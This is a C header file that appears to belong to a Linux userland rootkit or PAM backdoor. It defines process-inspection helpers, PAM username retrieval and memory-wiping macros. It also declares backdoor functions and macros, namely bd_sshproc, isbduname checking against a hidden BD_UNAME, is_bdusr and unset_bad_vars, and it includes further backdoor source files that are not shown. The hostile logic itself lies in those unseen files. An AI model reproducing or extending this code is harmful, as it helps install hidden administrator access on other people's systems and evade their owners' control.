#ifndef UTIL_H
#define UTIL_H

#define CMDLINE_PATH      "/proc/%d/cmdline"
#define FALLBACK_PROCNAME "YuuUUU"
#define NAME_MAXLEN       128
#define CMDLINE_MAXLEN    512

#define PID_MAXLEN      16
#define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN

#define MODE_NAME     0x01
#define MODE_CMDLINE  0x02

static void fallbackme(char **dest);
static char *get_cmdline(pid_t pid);
static int  open_cmdline(pid_t pid);

static char *process_info(pid_t pid, int mode);
#define process_name()    process_info(getpid(), MODE_NAME)
#define process_cmdline() process_info(getpid(), MODE_CMDLINE)

static int cmp_process(char *name);
static char *str_process(char *name);
static int process(char *name);
static int bd_sshproc(void);
#include "processes.c"

#define isbduname(uname) !xstrncmp(uname, BD_UNAME)

static char *get_username(const pam_handle_t *pamh){
	void *u = NULL;
	if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS)
		return NULL;
	return (char *)u;
}

#define _pam_overwrite(x)      \
do{                            \
    register char *__xx__;     \
    if((__xx__=(x)))           \
        while(*__xx__)         \
            *__xx__++ = '\0';  \
}while(0)

#define _pam_drop(X)           \
do{                            \
    if(X){                     \
        free(X);               \
        X = NULL;              \
    }                          \
}while(0)

int not_user(int id){
    if(getuid() != id && geteuid() != id)
        return 1;
    return 0;
}

static void unset_bad_vars(void);
static int is_bdusr(void);
#include "bdusr.c"




#endif
